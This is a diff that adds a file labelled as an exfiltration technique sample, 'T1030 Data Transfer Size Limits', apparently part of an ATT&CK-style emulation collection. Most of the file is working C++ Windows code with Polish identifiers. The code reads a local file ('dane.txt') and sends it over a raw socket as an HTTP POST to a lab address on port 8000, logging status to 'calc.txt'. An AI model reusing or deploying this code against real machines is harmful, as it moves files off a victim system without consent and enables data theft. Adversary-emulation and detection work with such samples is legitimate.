@@ -1,0 +1,109 @@
+---
+title: "T1030.Data Transfer Size Limits"
+folder: "13. Exfiltration"
+---
+
+
+
+
+
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+constexpr int BUFFER_SIZE = 512;
+
+bool WyslijPlik(const std::string& nazwaPliku, const std::string& adresIP, int port) {
+    std::ofstream dest("calc.txt", std::ios::binary);
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        dest << "Błąd przy inicjalizacji Winsock." << std::endl;
+        return false;
+    }
+
+    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sockfd == INVALID_SOCKET) {
+        dest << "Błąd przy tworzeniu gniazda." << std::endl;
+        WSACleanup();
+        return false;
+    }
+
+    sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(port);
+    inet_pton(AF_INET, adresIP.c_str(), &serv_addr.sin_addr);
+
+    if (connect(sockfd, reinterpret_cast<sockaddr*>(&serv_addr), sizeof(serv_addr)) == SOCKET_ERROR) {
+        dest << "Błąd przy łączeniu z serwerem." << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    std::ifstream plik(nazwaPliku, std::ios::binary);
+    if (!plik.is_open()) {
+        dest << "Nie można otworzyć pliku: " << nazwaPliku << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    plik.seekg(0, std::ios::end);
+    std::streampos dlugoscPliku = plik.tellg();
+    plik.seekg(0, std::ios::beg);
+
+    std::string header = "POST / HTTP/1.1\r\n";
+    header += "Host: " + adresIP + ":" + std::to_string(port) + "\r\n";
+    header += "Content-Type: application/octet-stream\r\n";
+    header += "Content-Length: " + std::to_string(dlugoscPliku) + "\r\n\r\n";
+
+    int bytesSent = send(sockfd, header.c_str(), header.size(), 0);
+    if (bytesSent == SOCKET_ERROR) {
+        dest << "Błąd przy wysyłaniu nagłówka żądania POST." << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    char buffer[BUFFER_SIZE];
+    while (!plik.eof()) {
+        plik.read(buffer, BUFFER_SIZE);
+        int bytesRead = static_cast<int>(plik.gcount());
+        int bytesSent = send(sockfd, buffer, bytesRead, 0);
+        if (bytesSent == SOCKET_ERROR) {
+            std::cerr << "Błąd przy wysyłaniu danych." << std::endl;
+            closesocket(sockfd);
+            WSACleanup();
+            return false;
+        }
+        if (bytesRead == 0) {
+            break; 
+        }
+    }
+
+    closesocket(sockfd);
+    plik.close();
+    dest.close(); 
+
+    dest << "Plik " << nazwaPliku << " został wysłany na serwer." << std::endl;
+    return true;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::string nazwaPliku = "dane.txt";
+    std::string adresIP = "10.0.2.15";
+    int port = 8000;
+
+    if (WyslijPlik(nazwaPliku, adresIP, port)) {
+        std::cout << "Wysyłanie pliku powiodło się." << std::endl;
+    }
+    else {
+        std::cerr << "Wysyłanie pliku nie powiodło się." << std::endl;
+    }
+    return 0;
+}
